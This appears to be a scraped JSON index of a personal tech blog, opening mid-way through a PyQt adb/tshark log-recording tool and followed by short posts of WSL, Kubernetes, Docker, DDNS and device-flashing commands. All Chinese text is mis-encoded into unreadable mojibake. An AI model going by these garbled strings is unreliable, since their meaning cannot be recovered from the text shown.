self.setWindowTitle(&quot;TBox Log Tool&quot;) # åˆ›å»ºæ§ä»¶ device_label = QLabel(&quot;ADBè®¾å¤‡:&quot;) self.device_combo = QComboBox() self.refresh_button = QPushButton(&quot;åˆ·æ–°&quot;) self.connect_button = QPushButton(&quot;è¿æ¥&quot;) self.disconnect_button = QPushButton(&quot;æ–­å¼€&quot;) self.disconnect_button.setEnabled(False) case_label = QLabel(&quot;æ—¥å¿—å:&quot;) self.case_edit = QLineEdit() self.case_edit.setEnabled(False) self.record_button = QPushButton(&quot;å¼€å§‹å½•åˆ¶&quot;) self.record_button.setEnabled(False) self.stop_button = QPushButton(&quot;åœæ­¢å½•åˆ¶&quot;) self.stop_button.setEnabled(False) atport_label = QLabel(&quot;AT COMå£:&quot;) self.atport_edit = QLineEdit() self.offline_button = QPushButton(&quot;å…³é—­å°„é¢‘æ¨¡å—&quot;) self.online_button = QPushButton(&quot;æ‰“å¼€å°„é¢‘æ¨¡å—&quot;) self.online_button.setEnabled(False) self.hmi_button = QPushButton(&quot;è¿æ¥HMI&quot;) net_label = QLabel(&quot;é€‰æ‹©ç½‘å£:&quot;) self.net_device_combo = QComboBox() self.net_capture_enable = QCheckBox(&quot;å½•åˆ¶ä»¥å¤ªç½‘æŠ¥æ–‡&quot;) self.ocpplog_button = QPushButton(&quot;å¼¹å‡ºocpplog&quot;) self.ocpplog_button.setEnabled(False) # å¸ƒå±€æ§ä»¶ device_layout = QHBoxLayout() device_layout.addWidget(device_label) device_layout.addWidget(self.device_combo) device_layout.addWidget(self.refresh_button) device_layout.addWidget(self.connect_button) device_layout.addWidget(self.disconnect_button) offline_layout = QHBoxLayout() offline_layout.addWidget(atport_label) offline_layout.addWidget(self.atport_edit) offline_layout.addWidget(self.offline_button) offline_layout.addWidget(self.online_button) offline_layout.addWidget(self.hmi_button) case_layout = QHBoxLayout() case_layout.addWidget(case_label) case_layout.addWidget(self.case_edit) case_layout.addWidget(self.record_button) case_layout.addWidget(self.stop_button) netcapure_layout = QHBoxLayout() netcapure_layout.addWidget(net_label) netcapure_layout.addWidget(self.net_device_combo) netcapure_layout.addWidget(self.net_capture_enable) netcapure_layout.addWidget(self.ocpplog_button) main_layout = QVBoxLayout() main_layout.addLayout(device_layout) main_layout.addLayout(offline_layout) main_layout.addLayout(case_layout) main_layout.addLayout(netcapure_layout) self.setLayout(main_layout) # ç»‘å®šäº‹ä»¶ self.refresh_button.clicked.connect(self.refresh_devices) self.connect_button.clicked.connect(self.connect_device) self.disconnect_button.clicked.connect(self.disconnect_device) self.offline_button.clicked.connect(self.offline) self.online_button.clicked.connect(self.online) self.hmi_button.clicked.connect(self.connect_hmi) self.record_button.clicked.connect(self.start_record) self.stop_button.clicked.connect(self.stop_record) self.ocpplog_button.clicked.connect(self.open_ocpp) # åˆå§‹åŒ–è®¾å¤‡åˆ—è¡¨ self.refresh_devices() self.refresh_net_devices() # print(self.initInterfaceDict()) def getConfigValue(self, name): # è·å–config.iniä¸­çš„é…ç½® å½“å‰é…ç½®é¡¹åªæœ‰ä¸€ä¸ªtsharkè·¯å¾„ self.config = configparser.ConfigParser() self.config.read('config.ini') value = self.config.get(&quot;config&quot;, name) return value def refresh_devices(self): # åˆ·æ–°è®¾å¤‡åˆ—è¡¨ devices = self.get_devices() if devices != self.devices: self.devices = devices self.device_combo.clear() self.device_combo.addItems(self.devices) def get_devices(self): # è·å–è®¾å¤‡åˆ—è¡¨ devices = [] try: if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None output = subprocess.check_output([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;devices&quot;],startupinfo=startupinfo).decode(&quot;utf-8&quot;) for line in output.splitlines()[1:]: if line.strip(): devices.append(line.split(&quot;\\t&quot;)[0]) except subprocess.CalledProcessError: pass return devices def refresh_net_devices(self): # åˆ·æ–°è®¾å¤‡åˆ—è¡¨ net_devices = self.initInterfaceDict() # print(net_devices) # if net_devices != self.initInterfaceDict: self.net_devices = net_devices # self.net_device_combo.clear() self.net_device_combo.addItems(self.net_devices) # print(net_devices) def initInterfaceDict(self): # è·å–æ¥å£åˆ—è¡¨ tshark_path = self.getConfigValue(&quot;tshark_path&quot;) cmd = f'{tshark_path} -D' # cmd = '&quot;C:/Program Files/Wireshark/tshark.exe&quot; -D' result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) interfaceList = result.stdout.decode().strip().split('\\r\\n') # print(interfaceList) interfaceList_dict = {} for item in interfaceList: key = item.split('(', 1)[1].strip(') ') # è·å–æ‹¬å·ä¸­çš„å†…å®¹ value_list = [s for s in item.split() if s.startswith('\\\\')] if value_list: # æ£€æŸ¥åˆ—è¡¨æ˜¯å¦ä¸ºç©º value = value_list[0] # è·å–ä»¥&quot;\\\\Device\\\\&quot;å¼€å¤´çš„å­—ç¬¦ä¸² interfaceList_dict[key] = value # print(interfaceList_dict) return interfaceList_dict def connect_device(self): # è¿æ¥è®¾å¤‡ self.device = self.device_combo.currentText() if not self.device: QMessageBox.warning(self, &quot;è­¦å‘Š&quot;, &quot;è¯·é€‰æ‹©ä¸€ä¸ªè®¾å¤‡&quot;) return try: # subprocess.check_output([&quot;adb&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;, &quot;echo&quot;, &quot;connected&quot;]) if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None name = &quot;root&quot; password = &quot;*************&quot; self.process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,startupinfo=startupinfo, encoding=&quot;utf-8&quot;, universal_newlines=True) # self.wait() # print(self.stdout.read()) # print(&quot;è¾“å…¥ç”¨æˆ·å&quot;) time.sleep(3) self.process.stdin.write(name + '\\n') self.process.stdin.flush() # # print(&quot;è¾“å…¥å¯†ç &quot;) time.sleep(3) self.process.stdin.write(password + '\\n') self.process.stdin.flush() self.connect_button.setEnabled(False) self.disconnect_button.setEnabled(True) self.record_button.setEnabled(True) self.case_edit.setEnabled(True) self.ocpplog_button.setEnabled(True) except subprocess.CalledProcessError: QMessageBox.warning(self, &quot;è­¦å‘Š&quot;, &quot;è¿æ¥è®¾å¤‡å¤±è´¥&quot;) def disconnect_device(self): # æ–­å¼€è®¾å¤‡ self.device = None self.connect_button.setEnabled(True) self.stop_button.setEnabled(False) self.stop_record() self.case_edit.setEnabled(False) self.record_button.setEnabled(False) self.ocpplog_button.setEnabled(False) self.disconnect_button.setEnabled(False) def offline(self): # è·å–ç«¯å£å’Œæ³¢ç‰¹ç‡è¾“å…¥æ¡†ä¸­çš„å€¼ self.port = self.atport_edit.text() if not self.port: QMessageBox.warning(self, &quot;è­¦å‘Š&quot;, &quot;è¯·è¾“å…¥AT COMå£å¦‚â€˜COM19â€™&quot;) return # æ‰§è¡Œç¦»çº¿å‘½ä»¤ ser_obj = ser.Serial(port=self.port, baudrate=115200) ser_obj.write(&quot;AT+CFUN=4\\r&quot;.encode()) self.online_button.setEnabled(True) self.offline_button.setEnabled(False) def online(self): # è·å–ç«¯å£å’Œæ³¢ç‰¹ç‡è¾“å…¥æ¡†ä¸­çš„å€¼ self.port = self.atport_edit.text() if not self.port: QMessageBox.warning(self, &quot;è­¦å‘Š&quot;, &quot;è¯·è¾“å…¥AT COMå£å¦‚â€˜COM19â€™&quot;) return # æ‰§è¡Œåœ¨çº¿å‘½ä»¤ ser_obj = ser.Serial(port=self.port, baudrate=115200) ser_obj.write(&quot;AT+CFUN=1\\r&quot;.encode()) self.online_button.setEnabled(False) self.offline_button.setEnabled(True) def connect_hmi(self): # æ£€æŸ¥è®¾å¤‡çŠ¶æ€ if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None hmi_devices = self.get_devices() print(hmi_devices) if '192.168.1.80:5555' in hmi_devices: # è®¾å¤‡å·²è¿æ¥ï¼Œç›´æ¥å¯åŠ¨scrcpy cmd = '.\\scrcpy-win64-v1.25\\scrcpy.exe -s 192.168.1.80 --always-on-top --max-size 640 --lock-video-orientation=2' self.process = subprocess.Popen(cmd, shell=True, encoding=&quot;utf-8&quot;,startupinfo=startupinfo) else: # è®¾å¤‡æœªè¿æ¥ï¼Œå…ˆè¿æ¥è®¾å¤‡å†å¯åŠ¨scrcpy # cmd = &quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;connect&quot; &quot;192.168.1.80&quot; self.process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;connect&quot;, &quot;192.168.1.80&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=&quot;utf-8&quot;, universal_newlines=True,startupinfo=startupinfo) time.sleep(5) cmd = '.\\scrcpy-win64-v1.25\\scrcpy.exe -s 192.168.1.80 --always-on-top --max-size 640 --lock-video-orientation=2' self.process = subprocess.Popen(cmd, shell=True, encoding=&quot;utf-8&quot;,startupinfo=startupinfo) def start_record(self): # å¼€å§‹å½•åˆ¶ self.case_name = self.case_edit.text().strip() if not self.case_name: QMessageBox.warning(self, &quot;è­¦å‘Š&quot;, &quot;è¯·è¾“å…¥æ—¥å¿—å&quot;) return if self.logcat_process or self.ocpplog_process: QMessageBox.warning(self, &quot;è­¦å‘Š&quot;, &quot;æ­£åœ¨å½•åˆ¶ä¸­&quot;) return # åˆ›å»ºä»¥å½“å‰æ—¥æœŸä¸ºåå­—çš„æ–‡ä»¶å¤¹ current_date = datetime.datetime.now().strftime(&quot;%Y-%m-%d&quot;) self.log_folder = os.path.join(os.getcwd(), &quot;Log&quot;, current_date) if not os.path.exists(self.log_folder): os.makedirs(self.log_folder) logcat_file = os.path.join(self.log_folder, self.get_logcat_file()) ocpplog_file = os.path.join(self.log_folder, self.get_ocpplog_file()) netlog_file = os.path.join(self.log_folder, self.get_netlog_file()) if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None self.logcat_process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;logcat&quot;, &quot;-s&quot;, &quot;TBoxService &quot;], stdout=open(logcat_file, &quot;wb&quot;), startupinfo=startupinfo) self.ocpplog_process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;, &quot;/oemapp/bin/ocppCli&quot;], stdout=open(ocpplog_file, &quot;wb&quot;), startupinfo=startupinfo) if self.net_capture_enable.isChecked(): # print(&quot;å¼€å§‹å½•åˆ¶ä»¥å¤ªç½‘æŠ¥æ–‡&quot;) net_dict = self.initInterfaceDict() net_device = self.net_device_combo.currentText() net_id = net_dict[net_device] tshark_path = self.getConfigValue(&quot;tshark_path&quot;) cmd = f'{tshark_path} -i {net_id} -w &quot;{netlog_file}&quot;' print(cmd) self.net_capture_process = subprocess.Popen(cmd,startupinfo=startupinfo) self.record_button.setEnabled(False) self.stop_button.setEnabled(True) self.case_edit.setEnabled(False) self.disconnect_button.setEnabled(False) def stop_record(self): # åœæ­¢å½•åˆ¶ if self.logcat_process: self.logcat_process.terminate() self.logcat_process.wait() self.logcat_process = None if self.ocpplog_process: self.ocpplog_process.terminate() self.ocpplog_process.wait() self.ocpplog_process = None if self.net_capture_process: self.net_capture_process.terminate() self.net_capture_process.wait() self.net_capture_process = None self.record_button.setEnabled(True) self.stop_button.setEnabled(False) self.case_edit.setEnabled(True) self.disconnect_button.setEnabled(True) def get_logcat_file(self): # è·å–logcatæ–‡ä»¶å base_name = &quot;logcat_&quot; + self.case_name + &quot;.log&quot; index = 1 while os.path.exists(os.path.join(self.log_folder, base_name)): base_name = &quot;logcat_&quot; + self.case_name + &quot;_&quot; + str(index) + &quot;.log&quot; index += 1 return base_name def get_ocpplog_file(self): # è·å–ocpplogæ–‡ä»¶å base_name = &quot;ocpplog_&quot; + self.case_name + &quot;.log&quot; index = 1 while os.path.exists(os.path.join(self.log_folder, base_name)): base_name = &quot;ocpplog_&quot; + self.case_name + &quot;_&quot; + str(index) + &quot;.log&quot; index += 1 return base_name def get_netlog_file(self): # è·å–netlogæ–‡ä»¶å base_name = &quot;netlog_&quot; + self.case_name + &quot;.pcapng&quot; index = 1 while os.path.exists(os.path.join(self.log_folder, base_name)): base_name = &quot;netlog_&quot; + self.case_name + &quot;_&quot; + str(index) + &quot;.pcapng&quot; index += 1 return base_name def open_ocpp(self): # os.system(' start cmd.exe /K ./scrcpy-win64-v1.25/adb.exe -s b286526e shell /oemapp/bin/ocppCli') self.device = self.device_combo.currentText() self.process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;, &quot;/oemapp/bin/ocppCli&quot;]) if __name__ == '__main__': app = QApplication(sys.argv) recorder = LogRecorder() recorder.show() sys.exit(app.exec_()) ","link":"https://hellogu.github.io/post/shi-yong-pyqt-kai-fa-yi-ge-gong-zuo-xiao-lu-gong-ju-tbox_log_tool/"},{"title":"Win10 Wsl2å®‰è£…Ubuntu","content":"wsl --install #ä½¿ç”¨éƒ¨ç½²æ˜ åƒæœåŠ¡å’Œç®¡ç†å·¥å…·ï¼ˆDISMï¼‰æ¥å¯ç”¨Windowså­ç³»ç»ŸLinuxåŠŸèƒ½ dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart #å¯ç”¨è™šæ‹Ÿæœºå¹³å°åŠŸèƒ½ dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart #å°†WSLçš„é»˜è®¤ç‰ˆæœ¬è®¾ç½®ä¸º2 wsl --set-default-version 2 ","link":"https://hellogu.github.io/post/ling-sui-bei-wang-lu/"},{"title":"ç»™K8Sé›†ç¾¤ä¸­çš„nodeæ‰¹é‡è¿½åŠ æ ‡ç­¾","content":"Kubectlä¸­å¥½åƒæ²¡æœ‰è¿™æ ·æ‰¹é‡æ“ä½œnodeæ ‡ç­¾çš„å‘½ä»¤ï¼Œæ‰€ä»¥å¾—é€šè¿‡awkæ¥æ“ä½œäº† #è¿‡æ»¤å‡ºå…·æœ‰xib.desb/mesh=trueæ ‡ç­¾çš„èŠ‚ç‚¹ kubectl get nodes --show-labels | grep xib.desb/mesh=true | awk -F ' ' '{print $1}' &gt; node.txt #ç»™èŠ‚ç‚¹æ·»åŠ ä¸€ä¸ªæ–°çš„æ ‡ç­¾xib.desb/mesh-control=true for i in $(cat node.txt) ; do kubectl label node $i xib.desb/mesh-control=true ; done ","link":"https://hellogu.github.io/post/gei-k8s-ji-qun-zhong-de-node-pi-liang-zhui-jia-biao-qian/"},{"title":"19å—çš„åŒé€Ÿæ‰‹ç”µé’»","content":"èƒ½çœ‹å‡ºæ¥åŒå¿ƒåº¦ä¸€èˆ¬ï¼Œä¸è¿‡19è¦å•¥è‡ªè¡Œè½¦ï¼Œæ‹§ä¸€æ¬¡å®¶å…·å°±å›æœ¬ ","link":"https://hellogu.github.io/post/19-kuai-de-shuang-su-shou-dian-zuan/"},{"title":"openwrtæˆ–è½¯è·¯ç”±ä¸­ä½¿ç”¨dockeréƒ¨ç½²openclash","content":"ä¸»ç¨‹åº docker run -d --name=clash -v &quot;$PWD/config.yaml:/root/.config/clash/config.yaml&quot; -p &quot;7890:7890&quot; -p &quot;9090:9090&quot; --restart=unless-stopped dreamacro/clash é¢æ¿ docker run -p 1234:80 -d --rm --name yacd haishanh/yacd docker wol docker run --rm --network host fopina/wakeonlan wake d8:cb:8a:7b:77:a5 ","link":"https://hellogu.github.io/post/openwrt-huo-ruan-lu-you-zhong-shi-yong-docker-bu-shu-openclash/"},{"title":"Dockeréƒ¨ç½²Jenkins","content":"ç»™æµ‹è¯•ç¯å¢ƒéƒ¨ç½²äº†ä¸€ä¸ªJenkinsç”¨äºç®€åŒ–æ‰“åŒ…æ“ä½œï¼Œç”¨æ¥ç”¨å»å‘ç°è¿˜æ˜¯ä½¿ç”¨Dockeréƒ¨ç½²æœ€ä¸ºæ–¹ä¾¿ docker run \\ -u root \\ -d \\ -p 8080:8080 \\ -p 50000:50000 \\ -v /home/jenkins_home:/var/jenkins_home \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /etc/localtime:/etc/localtime \\ jenkinsci/blueocean ","link":"https://hellogu.github.io/post/docker-bu-shu-jenkins/"},{"title":"ä½¿ç”¨tmmåˆ®å‰Šå™¨è·å–å½±è§†åº“å…ƒæ•°æ®","content":"ä¹‹å‰éƒ¨ç½²äº†jellyfinå½±è§†åº“ï¼Œä½†ç”±äºç½‘ç»œæƒ…å†µç»å¸¸è·å–ä¸åˆ°å½±è§†çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œè¯•ç”¨äº†ä¸€ä¸‹tmmåˆ®å‰Šå™¨å‘ç°éå¸¸å¥½ç”¨ï¼Œtmmåˆ®å‰Šå™¨æ”¯æŒwindowså®‰è£…ï¼Œä½†è¿˜æ˜¯ä½¿ç”¨Dockeréƒ¨ç½²æ›´æ–¹ä¾¿ï¼Œç¦»çº¿ä¸‹è½½å®Œç”µå½±ååœ¨æµè§ˆå™¨ä¸­æ“ä½œåˆ®å‰Šä¸€ä¸‹å…ƒæ•°æ®å°±è¡Œ docker run -d --name=tinymediamanager \\ -v /storage/tmm/config:/config \\ -v /storage/tmm/media:/media \\ -e GROUP_ID=0 -e USER_ID=0 -e TZ=Europe/Madrid \\ -p 5800:5800 \\ -p 5900:5900 \\ romancin/tinymediamanager:latest ","link":"https://hellogu.github.io/post/shi-yong-tmm-gua-xue-qi-huo-qu-ying-shi-ku-yuan-shu-ju/"},{"title":"Dockeréƒ¨ç½²Jellyfinå½±è§†åº“","content":"docker run -d \\ -v /storage/jellyfin/config:/config \\ -v /storage/jellyfin/cache:/cache \\ -v /storage/jellyfin/media:/media \\ --net=host \\ --name=jellyfin \\ --restart=always \\ jellyfin/jellyfin:latest ","link":"https://hellogu.github.io/post/docker-bu-shu-jellyfin-ying-shi-ku/"},{"title":"ä½¿ç”¨watchtoweræ›´æ–°dockerå®¹å™¨","content":"watchtoweræŒä¹…è¿è¡Œ(è¿è¡Œå®Œæˆååˆ›å»ºwatchtowerå®¹å™¨è‡ªåŠ¨æ›´æ–°watchtower.listä¸­çš„å®¹å™¨) docker run -d \\ --name watchtower \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower -c \\ $(cat /opt/watchtower.list) watchtowerä¸€æ¬¡æ€§è¿è¡Œ(è¿è¡Œå®Œæˆååˆ é™¤watchtowerå®¹å™¨) docker run --rm \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower -c \\ --run-once \\ qinglong aria2-pro ","link":"https://hellogu.github.io/post/shi-yong-watchtower-geng-xin-docker-rong-qi/"},{"title":"èŠ±ç”Ÿå£³DDNSå¼ºåˆ¶æ›´æ–°","content":"ç”±äºæ²¡æœ‰å›ºå®šå…¬ç½‘IPï¼Œä½¿ç”¨èŠ±ç”Ÿå£³DDNSæœåŠ¡æ¥è®¿é—®å®¶é‡Œçš„è·¯ç”±å™¨ï¼Œæœ‰æ—¶è·¯ç”±å™¨é‡æ–°æ‹¨å·äº†ä½†èŠ±ç”Ÿå£³æ²¡æœ‰åŠæ—¶æ›´æ–°IPï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å¼ºåˆ¶æ›´æ–°ä¸€ä¸‹ ç›´æ¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä»¥ä¸‹ http://username:password@ddns.oray.com/ph/update?hostname=yourhostname&amp;myip=ipaddress username: ä½ åœ¨èŠ±ç”Ÿå£³ä¸Šæ³¨å†Œçš„ç”¨æˆ·å password: ä½ çš„èŠ±ç”Ÿå£³å¯†ç  hostname: ä½ åœ¨èŠ±ç”Ÿå£³ä¸Šç”³è¯·çš„åŸŸåï¼šå¦‚ï¼štest.zicp.net myip : ä½ æƒ³æ›´æ–°æˆçš„IPåœ°å€ã€‚ï¼ˆå¯ä»¥ä¸å¡«ï¼Œå¦‚æœæ²¡æœ‰èŠ±ç”Ÿå£³ä¼šç›´æ¥ä½¿ç”¨ä½ çš„å‡ºå£å…¬ç½‘åœ°å€ï¼‰ è¿”å›è¯´æ˜ï¼š good æ›´æ–°æˆåŠŸï¼ŒåŸŸåçš„IPåœ°å€å·²ç»æ›´æ–°ï¼ŒåŒæ—¶ä¼šè¿”å›æœ¬æ¬¡æ›´æ–°æˆåŠŸçš„IPï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œå¦‚ï¼šgood 1.2.3.4 nochg æ›´æ–°æˆåŠŸï¼Œä½†æ²¡æœ‰æ”¹å˜IPã€‚ä¸€èˆ¬è¿™ç§æƒ…å†µä¸ºæœ¬æ¬¡æäº¤çš„IPè·Ÿä¸Šä¸€æ¬¡çš„ä¸€æ · notfqdn æœªæœ‰æ¿€æ´»èŠ±ç”Ÿå£³çš„åŸŸå nohost åŸŸåä¸å­˜åœ¨æˆ–æœªæ¿€æ´»èŠ±ç”Ÿå£³ nochg æ›´æ–°æˆåŠŸï¼Œä½†æ²¡æœ‰æ”¹å˜IPã€‚ä¸€èˆ¬è¿™ç§æƒ…å†µä¸ºæœ¬æ¬¡æäº¤çš„IPè·Ÿä¸Šä¸€æ¬¡çš„ä¸€æ · abuse è¯·æ±‚å¤±è´¥ï¼Œé¢‘ç¹è¯·æ±‚æˆ–éªŒè¯å¤±è´¥æ—¶ä¼šå‡ºç° !donator è¡¨ç¤ºæ­¤åŠŸèƒ½éœ€è¦ä»˜è´¹ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ï¼Œå¦‚https ","link":"https://hellogu.github.io/post/hua-sheng-ke-ddns-qiang-zhi-geng-xin/"},{"title":"æ–è®¯T1åˆ·æœºè®°å½•","content":"ä¸çŸ¥ä¸è§‰å·²ç»ä¸Šäº†4è½¦æ–è®¯è·¯ç”±å™¨äº†ï¼Œå‰å¤©è€çˆ¸æ‰“ç”µè¯æ¥è¯´å®¶é‡Œçš„å¤©çŒ«é­”ç›’è¶Šæ¥è¶Šå¡äº†ï¼Œç«‹é©¬äº¬ä¸œä¸‹å•åˆä¸Šä¸€è½¦æ–è®¯ç›’å­ã€‚ æ™’ä¸€ä¸‹å½“å¹´ç§’çš„ä¸¤å°1ä»£é­”ç›’æ–è®¯T1åˆ·æœºè®°å½• æˆ‘ä¹Ÿæ›¾æ¬§è¿‡ï¼Œå¯æƒœç°åœ¨è½¬éäº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯åˆ·æœºæ­¥éª¤å•¦ ææ–™ï¼šPCä¸€å°ï¼Œusbå…¬å¯¹å…¬ä¸€æ ¹ï¼ˆä¸¤æ ¹æ•°æ®çº¿å¯¹å‰ªï¼Œå‰¥å¼€çº¿ï¼Œé¢œè‰²ç›¸åŒçš„æ¥ä¸€èµ·ï¼‰ åˆ·æœºåŒ…ï¼šæ©å±±è®ºå›ï¼ŒZNDSè®ºå›å‡æœ‰ä¸‹è½½ï¼Œæˆ‘è¿™é‡ŒæŠŠyyfçš„å’Œwebpadä¸¤ä½å¤§ç¥çš„åˆ·æœºåŒ…éƒ½è¯•äº†ä¸€ä¸‹ï¼Œæœ€åç”¨äº†webpadçš„ã€‚ æœ¬æ¥æ˜¯è¦å‰ªä¸¤æ ¹æ•°æ®çº¿è‡ªå·±æ¥ä¸€ä¸‹usbå…¬å¯¹å…¬çš„ï¼Œå¥ˆä½•ä¸¤æ ¹çº¿å‰ªå¼€éƒ½åªæœ‰ä¸€é»‘ä¸€çº¢ä¸¤æ ¹çº¿ï¼Œåªèƒ½å……ç”µä¸èƒ½ä¼ è¾“æ•°æ®ï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸¤æ ¹çº¿æ˜¯ä¹°å•¥ä¸œè¥¿é€çš„äº†ï¼Œå¤ªä¼šæŠ é—¨äº†ï¼Œç”µçƒ™é“ç¦»å¼€å­¦æ ¡å¤šå¹´ä¸ç”¨æ—©å°±æ‰”äº†ï¼Œåªèƒ½æŠŠusbå¤´é’³ä¸‹æ¥æ’å…¥4æ ¹å›å½¢é’ˆå¯¹ä»˜ä¸€ä¸‹äº†ï¼Œå¤§å®¶æ¥æ•°æ®çº¿çš„æ—¶å€™è®°å¾—åŒæ ·é¢œè‰²æ¥ä¸€èµ·ï¼ï¼ï¼ æ²¡æœ‰ç”µçƒ™é“ï¼Œå›å½¢é’ˆæ’å…¥ä¹Ÿèƒ½ç”¨ï¼Œé—®é¢˜ä¸å¤§ æ¥ä¸‹æ¥å°±æ˜¯åˆ·æœºæ­¥éª¤äº†ï¼ æ‰“å¼€ä¸‹è½½å¥½çš„åˆ·æœºè½¯ä»¶ï¼Œå…ˆè£…å¥½é©±åŠ¨ å¯¼å…¥åˆ·æœºåŒ… ç‚¹å‡»å¼€å§‹åï¼Œå…ˆå°†usbæ’å…¥ç›’å­ï¼Œè¿ä¸Šç”µè„‘ï¼Œå†æ’å…¥ç”µæºï¼Œç”µè„‘è¯†åˆ«ä¹‹åï¼Œåˆ·æœºå·¥å…·è‡ªåŠ¨å¼€å§‹è¯»æ¡ ç­‰å¾…è¯»æ¡å®Œæˆï¼Œè¿›åº¦æ¡æ˜¾ç¤ºç»¿è‰²çš„100%å°±æ˜¯åˆ·æœºå®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æ’ä¸Šç”µè§†æœºè®¾ç½®å®Œæˆå°±å¯ä»¥ä½¿ç”¨äº†ï¼Œåˆ·äº†webappçš„åˆ·æœºåŒ…ä¹‹åä¹Ÿå¯ä»¥è¿è¡Œä¸€ä¸‹ä»–å¸–å­é‡Œæä¾›çš„å‡ ä¸ªç²¾ç®€çš„å‘½ä»¤è¡Œæ–‡ä»¶æ¥å°†â€œæ²™å‘ç®¡å®¶æ¡Œé¢â€æ›¿æ¢æˆâ€œå½“è´æ¡Œé¢â€ã€‚æˆ‘è¿™å›¾æ˜¯å·²ç»æ›¿æ¢äº†å½“è´æ¡Œé¢çš„ã€‚ ","link":"https://hellogu.github.io/post/fei-xun-t1-shua-ji-ji-lu/"},{"title":"æ—§æ‰‹æœºçš„ä½™çƒ­ï¼šåœ¨å®‰å“æ‰‹æœºä¸Šéƒ¨ç½²LNMP+WORDPRESSåšå®¢","content":"æ—§æ‰‹æœºçš„çæŠ˜è…¾ ç¡¬ä»¶ï¼šå®‰å“æ‰‹æœºä¸€å°ï¼ˆå·²rootï¼‰ è½¯ä»¶å·¥å…·ï¼šBusyBox linuxdeploy JuiceSSH secureCRT æ€è·¯ï¼š 1.æ­å»ºlinuxç¯å¢ƒ--&gt;åœ¨å®‰å“æ‰‹æœºä¸Šå®‰è£…BusyBoxã€linuxdeployã€JuiceSSH 2.éƒ¨ç½²LNMP--&gt;åœ¨linuxç¯å¢ƒä¸­ä½¿ç”¨oneinstackå·¥å…·ä¸€é”®éƒ¨ç½²LNMP 3.æ”¾ç½®wordpress--&gt;å°†wordpressæ¡†æ¶æ”¾åˆ°éƒ¨ç½²å¥½çš„LNMPç¯å¢ƒä¸­ 4.å¤–ç½‘è®¿é—®--&gt;ä½¿ç”¨ngrokå·¥å…·ï¼Œè®©ä½ çš„åšå®¢èƒ½ä»å¤–ç½‘è®¿é—® æ­£æ–‡ï¼š è‡ªä»å±å¹•åæ‰ï¼Œè¿™ä¸ªmoto x styleå·²ç»åœ¨æˆ‘æŠ½å±‰é‡Œèººäº†ä¸€å¹´åŠäº†ï¼Œæœ¬æ¥æ‹†æ•£äº†è£±èµ·æ¥ä»¥ç¤ºæƒ…æ€€çš„ï¼Œå¶ç„¶é—´å¾—çŸ¥è¿˜æœ‰åšæˆåšå®¢è¿™ä¹ˆä¸€ç§ç”¨æ³•ä¾¿è¡ŒåŠ¨äº†èµ·æ¥ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œå¼€å§‹äº†ã€‚ ç¬¬ä¸€æ­¥ï¼š 1.åœ¨å·²ç»rootè¿‡çš„æ‰‹æœºä¸Šå®‰è£…BusyBoxã€linuxdeployã€JuiceSSHè¿™ä¸‰ä¸ªAPP 2.ç‚¹å¼€BusyBoxï¼Œç‚¹å‡»å®‰è£…ï¼Œå¼¹å‡ºrootæƒé™ç¡®è®¤ç‚¹å‡»æˆäºˆã€‚ 3.ç‚¹å¼€linux deployï¼Œå…ˆç‚¹å‡»å³ä¸‹è§’çš„è®¾ç½®ï¼Œè®¾ç½®å¥½è¦å®‰è£…çš„linuxç‰ˆæœ¬ï¼Œè®¾ç½®å®Œä¹‹åï¼Œç‚¹å‡»å³ä¸Šè§’çš„ä¸‰ä¸ªç‚¹ç‚¹ï¼Œç‚¹å‡»å®‰è£…ã€‚ï¼ˆæˆ‘çš„æ‰‹æœºå±å¹•ä¸€åŠé»‘äº†ï¼Œæ‰€ä»¥æ˜¯è¿ç€ç”µè„‘æ§åˆ¶ç€æ“ä½œçš„ï¼‰ å…·ä½“linuxç‰ˆæœ¬å’Œå®‰è£…çš„è®¾ç½®å¯ä»¥å‚è€ƒæˆ‘çš„ï¼š å®¹å™¨ç±»å‹ï¼šchroot å‘è¡Œç‰ˆGUN/Linuxï¼šDebian æ¶æ„ï¼šarmhf 